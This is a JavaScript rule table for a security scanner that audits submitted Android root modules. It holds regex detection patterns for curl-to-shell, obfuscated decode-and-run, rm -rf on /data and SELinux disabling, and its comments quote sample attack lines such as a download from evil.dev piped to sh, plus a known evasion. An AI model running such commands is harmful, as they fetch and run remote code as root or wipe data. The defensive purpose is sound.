// 模块投稿安全审核 —— 判定规则表（纯函数，无 I/O，便于单测）
//
// 每条规则是一个对象：
//   id        规则唯一 id
//   category  分类：dangerous / network / privacy / metadata
//   severity  默认风险等级：info / low / medium / high
//   title     人读标题
//   advice    处置建议
//   anchor    fix4-P14：'line-start' | 'anywhere'（工厂默认 'anywhere'）——
//             这一支从哪儿开始找载荷。声明 line-start 的规则必须同时给出 anchorSibling，
//             即「脚本里写出这个载荷」那一支属于哪条规则；audit/scan.test.mjs 的锚点闭包表
//             逐条验证这两个字段说的都是真话。
//   scan(file, text) -> Finding[]
//
// Finding = { ruleId, category, severity, file, line, snippet, message, advice }
//
// 约定：
//   * 所有函数都是纯函数，不读文件、不读环境变量、不产生副作用。
//   * severity === 'info' 的发现只提示、不参与风险定级（投稿者隐私属此类）。
//
// Task 5.7 起本文件 import 了 ./elf-forensics.mjs 里的 capabilitySymbols —— 那是同一套纯函数
// （零 I/O、零依赖），引它只为「能力族表全仓只许有一份」（工单 §2）。
// S3-A（2026-10-16）起还 import CAPABILITY_IMPORT_CAP：截断文案里的这个数只许来自那一个常量，
// 本文件不许再写一遍 64。

import { capabilitySymbols, CAPABILITY_IMPORT_CAP } from './elf-forensics.mjs';

export const SEVERITY_ORDER = { info: 0, low: 1, medium: 2, high: 3 };

export const CATEGORY_LABEL = {
  dangerous: '危险模式',
  execution: '载荷间接执行',
  root: 'root 提权语义',
  network: '外联',
  privacy: '投稿者隐私（不计入风险等级）',
  metadata: '元数据一致性',
  structure: '包结构与审核覆盖度',
};

const MAX_SNIPPET = 160;

export function trimSnippet(s, max = MAX_SNIPPET) {
  const one = String(s).replace(/\s+/g, ' ').trim();
  return one.length > max ? one.slice(0, max) + '…' : one;
}

// ---------------------------------------------------------------------------
// 行级规则构造器
// ---------------------------------------------------------------------------

const UNQUOTE_EDGE = /^["']+|["']+$/g;

/**
 * fix6-F1：续行（line continuation）与逻辑行 —— 「这一行站在命令位还是参数位」的判据。
 *
 * 这是 shell 的解析事实，不是这一行自己的形状：上一条物理行以**奇数个**反斜杠结尾时，
 * 这一行接在那条命令后面（`\\` 是转义后的字面量反斜杠、行到此为止；`\\\` 才是续行）。
 * 把连续的物理行拼起来就是「逻辑行」，逻辑行的第一个词才是命令位。
 *
 * makeLineRule 本来就拿到整篇 text（scan(file, text)），所以这件事能在逐行匹配之前算出来。
 * 成本：每篇文本一次线性扫描；logicalLine 只在规则真的去读它时才拼（getter + 记忆化），
 * 单行成组（绝大多数）不产生任何额外分配 —— 攻击者能控制行数，别给他免费的 O(文件²)。
 */
function trailingBackslashes(line) {
  const m = /(\\+)$/.exec(String(line));
  return m ? m[1].length : 0;
}

function endsWithContinuation(line) {
  return trailingBackslashes(line) % 2 === 1;
}

/**
 * Task 3.2：shell 的**保留字**（控制词）。它们站在命令位上时本身不是命令，它后面那个词才是这条逻辑行的命令。
 *
 * 逐字依据（计划 §0.18）：真包 sensitive-props 挡住那条链的不是写法，是行首那个 `if` ——
 *   customize.sh:207 '    if wget -qO "$MODPATH/resetprop-rs" "$URL" 2>/dev/null || \'
 *   customize.sh:216 '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'
 * T3.1 把 sink 的写法面做完之后这条链仍 0 命中，原因只有这一个（task-3.1-report.md §9 / 夹具 T3.1-A5）。
 *
 * **这张表只许有一份，但从 Task 3.3 起它被两处读**（夹具 T3.2-D1 逐字钉着：声明一次、读两处）：
 *   ① `logicalFirstToken` —— 逻辑行的命令位（T3.2）；
 *   ② `PIPE_TO_SHELL_LEFT_EDGE` —— 下载器左边的语句起点（T3.3，见下面那段）。
 * 规则里再写一份「跳过 if」的局部逻辑、或者把词表抄进 pattern，都是 fix6-F1 那条病的复发 ——
 * 命令位与左边界有两套口径早晚会分叉（`elif` 补进这张表时，两处必须同时长出来，D1 会当场抓住没同时改的那一边）。
 *
 * 故意不收的（收错一格就等于把真命令从命令位上抹掉）：
 *   * `[` / `[[` / `test` —— 测试位里的路径算不算执行，本轮的答案是**不算**（夹具 T3.2-C3）：
 *     穿透 `if` 之后停在 `[` 上，`[` 既不是下载器也不是路径，sink 与执行形态都不成立。
 *   * `&&` `||` `|` `;` —— 段内的命令位由 `dteTokens` 的语句边界符口径说话，不归这里（夹具 T3.2-C2）。
 *   * `exec` / `setsid` / `nohup` / `busybox` / `eval` —— 它们**就是**命令（或会把参数拿去跑），
 *     收进表里等于让 `exec $MODPATH/x` 沉默；`DTE_EXEC_VERBS` / `ARG_ONLY_VERB` 那两张表一个字没动。
 *   * `esac` / `in` —— 真包里 `esac` 单独成行，与 `fi`/`done` 同格，但工单给的表里没有，本轮不扩；
 *     `in` 是 `case … in` 的另一半，把它收进来等于让 `in curl) …` 那种**case 标签行**站在语句起点上
 *     （夹具 T3.3-B4 钉的就是这一格）。
 * `time` 收：POSIX 保留字，且 `time wget -qO …` 里真正在下载的确实是那个 wget。
 * `elif` 收（Task 3.3 §2 补的那一格）：POSIX 保留字，`elif curl … | sh; then` 与 `if` 那一族是同一个写法。
 */
const SHELL_CONTROL_WORDS = new Set(['if', 'while', 'until', 'then', 'else', 'elif', 'do', 'for', 'case', 'select', 'time', '!', '{', '}', 'fi', 'done']);

// 逻辑行的命令位词：跳过空白行与「整行只有反斜杠」那种纯续行行，取第一个**不是 shell 控制词**的分词，
// 再去掉外层引号与词尾反斜杠。只取**第一个**真命令词 —— 判据要窄，多解析一个词就多一分猜测。
// 一串控制词走完仍然没有命令（`fi` / `done` / `} {`）⇒ 返回空串：命令位上没有任何东西（T3.2-C1）。
function logicalFirstToken(lines, head, end) {
  for (let k = head; k <= end; k++) {
    const raw = String(lines[k]).trim();
    if (!raw) continue;
    for (const w of raw.split(/\s+/)) {
      const t = w.replace(UNQUOTE_EDGE, '').replace(/\\+$/, '');
      if (/^\\+$/.test(t) || SHELL_CONTROL_WORDS.has(t)) continue;
      return t;
    }
  }
  return '';
}

/**
 * Task 3.3：语句起点判据 —— 上面那张表的**第二处读**（第一处是 logicalFirstToken 的命令位）。
 *
 * `PIPE_TO_SHELL` 改前的左边界是 `(?:^|[|;&`(]\s*)`：认行首、认语句边界符，**不认「控制词 + 空格」**，
 * 于是 `if curl -s https://x.dev/a | sh` 这种最像安装器的写法在 main 上是 low / auto-approve
 *（复现表：计划 §0.19 与 task-3.2-report.md §4 —— 七形里四形走机器人自动合并通道）。
 * 这里把左边界并上「一个或多个控制词 + 空白」，词表**只展开上面那一张**，一个字都不手写
 *（夹具 T3.2-D1：一张表、两处读、pattern 里不许出现第二张表或手抄的控制词）。
 *
 * 三条形状约束各有反向夹具（工单 §3），它们不是注释：
 *   ① 控制词必须整词站在语句起点上（前面只能是行首或边界符）⇒ `ui_print "if curl x | sh …"`
 *      与 `# 说明：if curl … | sh …` 都不命中（引号与注释符都不是边界符）；
 *   ② 控制词后面必须真的跟着空白 ⇒ `casey curl …` 这种词不算控制词；
 *   ③ 控制词可以连着来（外层 `+`）⇒ 组合形 `if ! curl … | sh; then` 命中；
 *   ④ `in` / 标签都不在表里 ⇒ `case "$TOOL" in curl) busybox wget … | sh ;; esac` 整行 0 命中
 *      —— 「任意单词后都算」的过宽版会红在 T3.3-B4 与 B2 上（变异 M3）。
 * 收缩进与标签豁免（Task 3.4，工单 §2）：第一支的 `^` 收成 `^\s*`，缩进裸写的管道（真包
 * entware-installer-for-magisk customize.sh:142 逐字那一行）从 0/low/auto-approve 变成 high/block；
 * 作为交换，行首缩进第一次把顶格式的两个旧形状（缩进 `curl)` 标签 = N1/N2）抬到了左边界上，
 * 由下面那条 CASE_LABEL_GUARD 一起闭掉。上面「`in`/标签都不在表里」的形状约束 ④ 不变，
 * 钉死的夹具从 T3.3-B4/D2 移交到 T3.4-B1/B3 与 T3.3-D2（已翻期望）。
 */
const SHELL_CONTROL_ALT = [...SHELL_CONTROL_WORDS]
  .map((w) => w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')) // 表里的 `{` `}` 必须按字面量进分支
  .join('|');
const SHELL_STATEMENT_START = `(?:^\\s*|[|;&\`(]\\s*)(?:(?:${SHELL_CONTROL_ALT})\\s+)+`;
const PIPE_TO_SHELL_LEFT_EDGE = `(?:^\\s*|[|;&\`(]\\s*|${SHELL_STATEMENT_START})`;

/**
 * Task 3.4（工单 §2）：case 标签豁免 —— 「下载器那个词**紧跟** `)`」不算命令。
 *
 * 它是**左边界判据的一半**，不是形状豁免：收缩进 `^\s*` 之后，`    curl)    busybox wget … | sh ;;`
 * 这种行首缩进的 case 标签行第一次站在了语句起点上，`^\s*curl` + `[^\n|]*\|` 会把它后半行整个吞成
 * 一条 high 误报（计划 §0.20 天真修法的打桩实测）；`(?!\s*\))` 让紧跟 `)` 的下载器词退回非命令位。
 * 「curl )」这种带空格的标签同样豁免（`\s*` 吃掉中间空白）。fix6-F1 的口径本轮同样适用：
 * 它豁免的是「标签不是命令」这一格，**不是**「这个文件可以放过」。
 *
 * 只许拼进 PIPE_TO_SHELL 第一支**一次**（夹具 T3.4-C1 按 pattern.source 数字面量出现次数 = 1 ——
 * 两处都加就是两份口径，早晚分叉）；`<(` 第二支没有标签形状，明令不拼（工单 §2）。
 * 已知的限度（工单 §3 E1，交回主控不修）：`    curl) curl -s https://evil.dev/x | sh ;;` ——
 * 标签形状**后面**接真管道，豁免咬住第一个 `curl`、第二个 `curl` 又不在任何左边界之后 ⇒ 仍 0 命中。
 * 收它就得让「标签后面再出下载器」翻回命中，那等于把 N1/N2/N6 那格误报再开回去。
 */
const CASE_LABEL_GUARD = '(?!\\s*\\))';

// 给 matcher（exclude / severityFor）的第三个可选参数：这一行在逻辑行里的位置。
// 老规则一个都不用改签名 —— 它是**加参数**，不是改既有参数顺序。
// Task 3 起这个函数是导出的：DOWNLOAD_THEN_EXEC 的「执行形态」判据必须吃同一份命令位实现 ——
// fix6-F1 那条「形状豁免不是免死金牌：命令位由**逻辑行**的命令位说话」的判据只有一份实现才守得住，
// 跨行规则自己再数一遍「本行第一个词」就是第二套口径，两套口径早晚会分叉。
export function buildLineContexts(lines) {
  const n = lines.length;
  const cont = new Array(n);
  for (let i = 0; i < n; i++) cont[i] = i > 0 && endsWithContinuation(lines[i - 1]);
  const out = new Array(n);
  let i = 0;
  while (i < n) {
    let j = i;
    while (j + 1 < n && cont[j + 1]) j++;
    const head = i;
    const end = j;
    const firstToken = logicalFirstToken(lines, head, end);
    let memo = null;
    for (let k = head; k <= end; k++) {
      out[k] = {
        lineNumber: k + 1,
        logicalFirstLine: head + 1,
        logicalLastLine: end + 1,
        isContinuation: cont[k],
        firstToken,
        get logicalLine() {
          if (memo === null) memo = lines.slice(head, end + 1).join(' ');
          return memo;
        },
      };
    }
    i = end + 1;
  }
  return out;
}

// fix4-P14：锚点是这条规则对「载荷出现在哪里」做出的声明，不是注释。
//   'anywhere'   —— 载荷出现在一行里的任何位置都算（工作规则一律用左边界类
//                    `(?:^|[\s"';&|`(])` 表达这件事，而不是裸 `^\s*`）。
//   'line-start' —— 这一支**只在行首**才成立（`.prop` 的键就在行首）。声明它的前提是同时给出
//                    anchorSibling，指名「脚本里把这个载荷写进文件」那一支在哪条规则里；
//                    没有 sibling 的 line-start 声明就是自我申报的盲区，闭包表直接判红。
// 为什么要有这个字段：同一族缺陷已经复发三次（fix1 的注释豁免、fix3-P7 的首匹配、本轮的行首锚点），
// 每一次都是「一条规则看得出行中写法、它的邻居看不出」，靠人逐条盯是盯不住的。
// 默认值只许住在这里（工厂），不许住在测试里替规则补 —— 否则表就成了装饰。
// 枚举就两个值：'line-start' | 'anywhere'；判据由闭包表拿着（下面 ANCHOR_WITNESS 那张表），
// 这里不设第二套校验：拼错的 anchor 会被表判红，而不是让工厂在 import 阶段把整条审核链崩掉。

function makeLineRule(spec) {
  const {
    id, category, title, advice,
    severity = 'medium',
    pattern,               // RegExp，用于逐行匹配
    exclude = null,        // RegExp（整行命中则跳过）或 (match, line, ctx) => boolean
    severityFor = null,    // (match, line, ctx) => severity，用于同一规则内分档；返回 null 表示不构成发现
    maxPerFile = 20,       // 同一文件同一规则最多报多少条，防止刷屏
    anchor = 'anywhere',   // fix4-P14：'line-start' | 'anywhere'，见上面工厂前的说明与 scan.test.mjs 的锚点闭包表
    anchorSibling = null,  // anchor === 'line-start' 时必填：覆盖行中形态的那一条规则（同规则里的另一支就写自己的 id）
  } = spec;
  // 这里**不抛**：判「声明合不合法、sibling 给没给」的活儿归 audit/scan.test.mjs 的锚点闭包表。
  // 工厂抛错会让整条审核链在 import 时崩掉（扫描器停摆比一条规则红更糟），而闭包表既拦得住
  // 缺声明、也拦得住谎报声明（变异 (c)/(d) 实测都判红），所以默认值住在这里、执法住在那里。

  return {
    id, category, title, advice, severity,
    anchor, anchorSibling,
    // 暴露 pattern 供报告渲染时对脚本全文做隐私脱敏（见 scan.mjs redactText）
    pattern,
    scan(file, text) {
      const findings = [];
      const lines = String(text == null ? '' : text).split(/\r?\n/);
      const contexts = buildLineContexts(lines); // fix6-F1：见上面 buildLineContexts 的说明
      const flags = pattern.flags.includes('g') ? pattern.flags : pattern.flags + 'g';
      for (let i = 0; i < lines.length && findings.length < maxPerFile; i++) {
        const line = lines[i];
        const ctx = contexts[i];
        const re = new RegExp(pattern.source, flags);
        // fix3-P7：一行要看**全部**匹配。旧写法只取第一个匹配，然后拿这一个匹配去判豁免与定档，
        // 于是「写在前面的那半行」替后面的真载荷决定了一切 —— 审批闸里的 fail-open：
        //   echo "resetprop -w ro.boot.verifiedbootstate green"; resetprop -w ro.boot.verifiedbootstate green
        //   rm -rf "$TMP_PATH"; rm -rf /data        （第一个匹配把第二个的 high 压成 medium）
        // 四条契约（评审实测后才定稿，改任一条都要重跑真实包的影响面）：
        //   1. 基数不变：一条规则一行**最多**一条发现。朴素「每个匹配都报」在 5 个真实社区包上
        //      实测 +10,046 条发现，其中 +10,001 条来自 SUSPICIOUS_DOMAIN（压缩过的 bundle 一行能命中几万次），
        //      那个版本不可用，所以这里遍历匹配但只收敛出一条。
        //   2. 豁免逐个匹配判：只有「这一行的全部匹配都可豁免」才跳过整行。
        //      （exclude 是 RegExp 时判据是整个 line，同一行每个匹配拿到的结论相同 —— 那些规则的
        //        行级豁免语义原样保留；只有函数式 exclude 才因 m.index 而逐个匹配分叉。）
        //   3. 定档取非豁免匹配里的**最大**档。
        //   4. snippet 取产生结论的那个匹配（最重的哪个就是哪个），不是最左的那个 ——
        //      指鹿为马的证据比没有证据更糟。平档取先出现的，保证纯函数确定性。
        // maxPerFile 仍是「每文件每规则的上限」，且因为基数按行收敛，它按**行**计（与旧实现一致）。
        let best = null;
        let m;
        while ((m = re.exec(line)) !== null) {
          if (m.index === re.lastIndex) re.lastIndex++; // 零宽匹配不许把 while 钉死（投稿者可控的 DoS）
          if (exclude) {
            const skipped = typeof exclude === 'function' ? exclude(m, line, ctx) : exclude.test(line);
            if (skipped) continue;                      // 这个匹配可豁免；别的匹配未必
          }
          const sev = typeof severityFor === 'function' ? severityFor(m, line, ctx) : severity;
          if (sev === null || sev === undefined) continue; // 该匹配不构成发现（规则内分档说了不算）
          if (!best || SEVERITY_ORDER[sev] > SEVERITY_ORDER[best.severity]) best = { severity: sev, m };
        }
        if (!best) continue; // 全部匹配都被豁免或都不构成发现 —— 这才跳过整行
        findings.push({
          ruleId: id,
          category,
          severity: best.severity,
          file,
          line: i + 1,
          snippet: trimSnippet(best.m[0]),
          message: title,
          advice,
        });
      }
      return findings;
    },
  };
}

// ---------------------------------------------------------------------------
// ② 危险模式
// ---------------------------------------------------------------------------

// rm -rf 之后取第一个“看起来像路径”的 token，用于判断是否作用于可变分区
function rmTarget(line, m) {
  const after = line.slice(m.index + m[0].length);
  const t = after.trim().split(/\s+/)[0] || '';
  return t.replace(/^["']|["']$/g, '');
}

// 模块自有目录 / 临时目录：这些是模块刷写中的正常清理动作，不算危险。
// 注意 /tmp/ 必须锚定在 token 开头或用空白/引号分隔，否则会误判 "/data/local/tmp/leftover"。
const SAFE_RM_TOKEN = /^(?:\$MODDIR|\$MODPATH|\$MOD\b|\$\{MODPATH\}|\$\{MODDIR\}|\$TMPDIR|\$TMP\b|\/tmp\/|\/data\/adb\/modules(?:_update)?\/)/;

// 注意 /tmp/ 必须锚定在 token 开头或用空白/引号分隔，否则会把 "/data/local/tmp/leftover" 误判为安全。
function isSafeRmToken(t) {
  return SAFE_RM_TOKEN.test(t) || /\$MODDIR|\$MODPATH|\$MOD\b|\$TMPDIR|\$TMP\b/.test(t);
}

// 判断路径是否“宽泛”：根目录本身、或以 * 结尾、或只剩一两个层级
function isBroadRmTarget(p) {
  if (!p) return true;
  if (/\*/.test(p)) return true;                                  // rm -rf /data/* 之类
  if (/^\/(data|system|vendor|product|system_ext|odm|sdcard|storage|mnt\/sdcard|mnt\/vendor)\/?(\*)?$/.test(p)) return true;
  if (/^\/(data|system|vendor|product|system_ext)\/\*/.test(p)) return true;
  return false;
}

export const RM_RF_MUTABLE = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'RM_RF_MUTABLE',
  category: 'dangerous',
  severity: 'medium',
  title: 'rm -rf 作用于 /data、/system 等可变分区',
  advice: '确认为何需要删除：作用域必须是模块自有目录。命中宽泛路径（/data/* 、分区根）视为高风险，需人工确认。',
  pattern: /\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b/,
  // 只删模块自身目录/临时目录是模块刷写中的正常操作，不报。
  // 必须用函数判断“rm 的目标 token 从头是否就是安全目录”，不能用整行正则：
  // 否则 /data/local/tmp/leftover 会因行内含 "/tmp/" 而被误判安全（假阴性）。
  exclude(m, line) { return isSafeRmToken(rmTarget(line, m)); },
  severityFor(m, line) {
    const t = rmTarget(line, m);
    if (!t) return 'medium';
    // 相对路径（不以 / 或 $ 开头）只作用于当前工作目录，风险有限
    if (!/^['"]?[/$\\]/.test(t)) return 'low';
    if (isSafeRmToken(t)) return 'low';
    return isBroadRmTarget(t) ? 'high' : 'medium';
  },
});

export const PIPE_TO_SHELL = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'PIPE_TO_SHELL',
  category: 'dangerous',
  severity: 'high',
  title: '下载内容直连 shell 执行（curl|sh / wget|sh）',
  advice: '禁止。远程内容可在 root 下任意执行且无法审计，必须先落盘、校验校验和，再执行。',
  // Task 3.3：左边界并上「控制词 + 空白」那一支（见 SHELL_STATEMENT_START 的说明）；
  // Task 3.4：第一支 `^` 收成 `^\s*`（收缩进缩进裸写），并在下载器组之后拼**恰好一条**
  // CASE_LABEL_GUARD（紧跟 `)` 的标签不是命令）。拼点在 `\b` 之前 —— 与拼在 `\b` 之后逐字等价
  //（两者都是零宽、同一个位置），但它让 T3.3-C1 钉的「右半三段」字节面一字未动（工单 §2 的口径）。
  // 右半 `\|[^\n]*\b(?:sh|bash|…)\b`、下载器四个写法、以及 `sh <(curl …)` 那一支逐字未动 ――
  // 由夹具 T3.3-C1 按 pattern.source 逐段子串对账（severity/category/title/advice 同一条钉着）。
  pattern: new RegExp(
    `${PIPE_TO_SHELL_LEFT_EDGE}(?:curl|wget|busybox\\s+wget|busybox\\s+curl)${CASE_LABEL_GUARD}\\b[^\\n|]*\\|[^\\n]*\\b(?:sh|bash|ash|ksh|zsh|python3?|perl|su)\\b`
    + `|\\b(?:sh|bash|ash)\\s*<\\(\\s*(?:curl|wget)\\b`),
});

export const DOWNLOAD_TO_STDOUT = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'DOWNLOAD_TO_STDOUT',
  category: 'dangerous',
  severity: 'low',
  title: '下载工具接收标准输出（wget -O- / curl -o-）',
  advice: '若后续接管道执行即为“直连执行”（见 PIPE_TO_SHELL）；仅落盘使用时可放行。',
  pattern: /\bwget\b[^\n]*\s-O\s*-|\bcurl\b[^\n]*\s-o\s*-|\bcurl\b[^\n]*\s--output\s+-/,
});

export const OBFUSCATED_DECODE_EXEC = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'OBFUSCATED_DECODE_EXEC',
  category: 'dangerous',
  severity: 'high',
  title: 'base64/xxd/openssl 混淆后直接执行',
  advice: '禁止。混淆执行是绕过静态审核的典型手法，必须还原为明文脚本再提交。',
  pattern: /^(?=.*\b(?:base64|xxd|uudecode|openssl\s+enc|busybox\s+base64)\b)(?=.*(?:\|\s*(?:sh|bash|ash)\b|\beval\b|>\s*\S+\s*(?:&&|;)\s*(?:sh|bash|ash)\b)).*$/,
});

export const OBFUSCATED_DECODE_ONLY = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'OBFUSCATED_DECODE_ONLY',
  category: 'dangerous',
  severity: 'medium',
  title: '存在 base64/xxd 解码动作（未看到直接执行）',
  advice: '解码结果必须可见。请人工确认解码后的产物是否被写入并执行。',
  pattern: /\b(?:base64|xxd|uudecode)\b[^\n]*(?:-d|--decode|-r\b)|\bopenssl\s+enc\b[^\n]*-d\b|\becho\s+[A-Za-z0-9+/=]{20,}\s*\|\s*base64\b/,
  exclude: /^(?=.*\b(?:base64|xxd|uudecode|openssl\s+enc|busybox\s+base64)\b)(?=.*(?:\|\s*(?:sh|bash|ash)\b|\beval\b)).*$/, // 已由 OBFUSCATED_DECODE_EXEC 报 high
});

const MODULE_OWN_DIR = /\$MODDIR|\$MODPATH|\$MOD\b|\$\{MODPATH\}|\$\{MODDIR\}|^\s*#/;

export const WRITE_SYSTEM_VENDOR = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'WRITE_SYSTEM_VENDOR',
  category: 'dangerous',
  severity: 'high',
  title: '直接写入或重挂载 /system、/vendor 分区',
  advice: 'Magisk/KernelSU 模块应通过 $MODPATH/system 覆盖层修改，不得直接写真实分区；直接写会破坏 dm-verity 与 OTA。',
  pattern: /(?:\btouch\b|\bcp\b|\bmv\b|\bdd\b|\bmkdir\b|\bsed\s+-i\b|\btee\b|>>?)[^\n]*\/(?:system|vendor|product|system_ext|odm)\/|\bmount\b[^\n]*-o[^\n]*\b(?:rw|remount)\b|\bremount\b|\bmount\s+-o\s+rw[^\n]*\/(?:system|vendor)\b/,
  exclude: MODULE_OWN_DIR, // $MODPATH/system/... 是标准覆盖层写法
});

export const SELINUX_DISABLE = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'SELINUX_DISABLE',
  category: 'dangerous',
  severity: 'high',
  title: '禁用/放宽 SELinux（setenforce 0）',
  advice: '禁止。关闭 SELinux 会让设备上所有应用失去强制访问控制，属于全局降级。',
  pattern: /\bsetenforce\s+(?:0|permissive)\b|[>]\s*\/sys\/fs\/selinux\/enforce\b|\bselinux\b[^\n]*=\s*0\b|\bsetprop\b[^\n]*selinux[^\n]*\b0\b/,
});

export const HOSTS_MODIFY = makeLineRule({
  anchor: 'anywhere', // fix4-P14：载荷出现在一行里任何位置都算（闭包表会用「x=1; 」前缀逐条验证）
  id: 'HOSTS_MODIFY',
  category: 'dangerous',
  severity: 'medium',
  title: '修改 /system/etc/hosts',
  advice: '改 hosts 会全局劫持域名解析。广告屏蔽类模块属合法用途，但仍需人工确认拦截清单。',
  pattern: /(?:\btouch\b|\bcp\b|\bcat\b|\bsed\b|\becho\b|>>?|\bmount\b)[^\n]*\bhosts\b|\bhosts\b[^\n]*(?:>>?|\bsed\s+-i\b)/,
});

// ---------------------------------------------------------------------------
// ②-b 载荷间接执行（execution）
// ---------------------------------------------------------------------------

/**
 * fix5-F1：「这一整行就是一份模块路径清单」的判据 —— 只给 EXEC_BUNDLED_FILE 命令位那一支的
 * **行首形态**用（那一支的承诺是「这一行的第一个词就是被执行的模块路径」）。
 * 实测反例（PerformanC_ReZygisk 的 stock update-binary 第 177-179 行）：
 *   rm -rf \
 *   $MODPATH/system/placeholder $MODPATH/customize.sh \
 *   $MODPATH/README.md $MODPATH/.git* 2>/dev/null
 * 那两行是上一条 `rm -rf` 的参数续行，一行里没有任何东西被执行；照抄官方模板的包每个白送两条 high。
 * 三个条件同时成立才算清单：
 *   ① 空白分词后 ≥2 个 token 以模块目录前缀开头（只有一个不算：`$MODDIR/tool.bin` 单独一行就是执行）；
 *   ② 其余 token 只能是重定向（`2>/dev/null`）、续行反斜杠或引号残留 —— 混进任何别的词（选项、参数、
 *      管道）就不当它是清单；
 *   ③ 行尾停在续行反斜杠或重定向上。
 * fix6-F1 对本判据的定位（判据本身一个字没改）：第五轮把它当成「这一行处于参数位」的**全部**
 * 证据，于是 `"$MODPATH/payload" "$MODPATH/x" 2>/dev/null` 这样单独成行的攻击也被读成清单 ——
 * 形状是投稿者挑的，条件③就成了可伪造的免死金牌。现在它降级成四条判据里的**最后一条**（形状），
 * 承重的那条换成了逻辑行的命令位（见下面 exclude 与 buildLineContexts）。条件③留着不删：
 * 留着它 ⇒ 新豁免 ⊆ 旧豁免 ⇒ 命中只增不减，代价是 `rm -rf \` 之后「行尾停在路径上」的那种清单
 * 仍是误报（第五轮就报，本轮照报，见任务报告的残余限度）。
 * 这条豁免只作用于「报不报」：scan.mjs 的 resolveBundledRefs 跑的是原始 pattern、不看 exclude，
 * 所以清单行引用的条目照样被拉进扫描面逐行读（见 scan.test.mjs 的 fix5-F1 端到端用例）。
 */
const MOD_PATH_TOKEN = /^(?:\$\{?(?:MODPATH|MODDIR|TMPMODDIR)\}?[\\/]|\/data\/adb\/modules\/)/;
// 命令位那一支的行首匹配：整个匹配从「可选引号 + 模块路径」开始，里面没有任何动词。
const BARE_MOD_PATH_MATCH = /^["']?(?:\$\{?(?:MODPATH|MODDIR|TMPMODDIR)\}?[\\/]|\/data\/adb\/modules\/)/;

function isModulePathListLine(line) {
  const tokens = String(line).trim().split(/\s+/);
  if (!tokens[0]) return false;
  let paths = 0;
  for (const token of tokens) {
    const bare = token.replace(UNQUOTE_EDGE, '');
    if (bare === '' || /^\\+$/.test(bare)) continue;   // 引号残留 / 续行反斜杠
    if (/[<>]/.test(bare)) continue;                    // 重定向（`2>/dev/null`）
    if (MOD_PATH_TOKEN.test(bare.replace(/\\/g, '/'))) { paths++; continue; }
    return false;                                       // 别的词：这不是清单
  }
  if (paths < 2) return false;
  const last = tokens[tokens.length - 1].replace(UNQUOTE_EDGE, '');
  return last === '' || /^\\+$/.test(last) || /[<>]/.test(last);
}

// fix6-F1：逻辑行的命令位如果是这个词表里的动词，那么续行上的模块路径就只是它的参数。
// 词表只收「操作文件、不会把参数当程序跑起来」的命令，且以实测为依据 —— 真实包里的这一族
// 全部形状都是官方模板的 `rm -rf \` + 续行清单（PerformanC_ReZygisk 的 update-binary 177-179）。
// **fail closed**：词表外的任何命令位（包括 `:`、`foo`、赋值前缀、裸反斜杠、没见过的命令）
// 一律不豁免。故意不收的：
//   * 解释器与前导词：sh / bash / ash / source / `.` / exec / setsid / nohup —— 它们就是把参数跑起来的东西；
//   * xargs / env / time / sudo / eval / busybox —— 「看起来像包装、实际会执行第一个参数」的那一族
//     （`busybox sh \` + 续行 `$MODPATH/x` 就是执行，词表外 ⇒ 照报）；
//   * mount / insmod / magiskpolicy 这类语义里带执行的动词。
const ARG_ONLY_VERB = new Set([
  'rm', 'rmdir', 'mkdir', 'touch', 'cp', 'mv', 'ln', 'install',
  'chmod', 'chown', 'chgrp', 'chcon', 'restorecon', 'set_perm', 'set_perm_recursive',
  'set_metadata', 'set_context', 'context',
  'ls', 'du', 'stat', 'wc', 'file', 'cat', 'head', 'tail', 'md5sum', 'sha1sum', 'sha256sum', 'cksum',
  'unzip', 'tar', '7z', 'gzip', 'gunzip', 'bzip2', 'bunzip2', 'xz', 'unxz',
]);

function isModulePathToken(t) {
  if (!t) return false;
  return MOD_PATH_TOKEN.test(String(t).replace(/\\/g, '/'));
}

// ---------------- A1：官方安装器那一行的「限定路径 + 逐字相符」降级 ----------------
// 拍板：用户（计划 §2.6 第三批，2026-10-14）；主控当时推荐的是**不豁免**，并在 2026-10-15 之前把
// 这条记反成「不豁免」。工单 briefs/task-a1.md。
//
// 三条**同时**成立才降级，缺一即报（工单 §2）：
//   ① 条目路径逐字等于 OFFICIAL_UPDATER_BINARY_ENTRY —— 不用 endsWith、不忽略大小写、
//      不折叠斜杠、不剥 `./`：那些都是投稿者可以自己造的形（夹具 A1-N2 钉六种近似写法）。
//   ② 整行逐字等于 OFFICIAL_INSTALLER_TEMPLATE_LINE。比对前只许做两件事：行尾单个 `\r` 归一 +
//      整行 trim（A1-02 钉这两件 —— CRLF 是行尾差异、不是形状差异，不为此交人工税）。
//      不许折叠内部空白、不许规范化变量名、不许脱外层 `[ ]`、不认 `test -f` / `$MODDIR` /
//      `${MODPATH}` / 带引号 / `if … then … fi`（A1-N5 逐条钉住，这组是本轮收窄可伪造性的主证据）。
//   ③ ② 比的是**整行**而不是那段匹配 ⇒ 同行还有别的命令必然不相等：`x=1; [ -f … ] && . …`
//      照报（A1-N3）。锚点闭包表（fix4-P14）的 witness 载荷 `sh $MODDIR/payload.bin` 本来就不是
//      这个形状，所以它「恰好 1 条命中」的不变量在本条前后一字不动 ⇒ **那张表对本轮不敏感、
//      不是这一格的证据**；真正拦住「豁免落在匹配上」的是 A1-N3 那一发前缀用例。
//
// 语义：降 severity，不删证据（沿用 P10 那条契约）—— 命中留在 report.findings，severity 'info'，
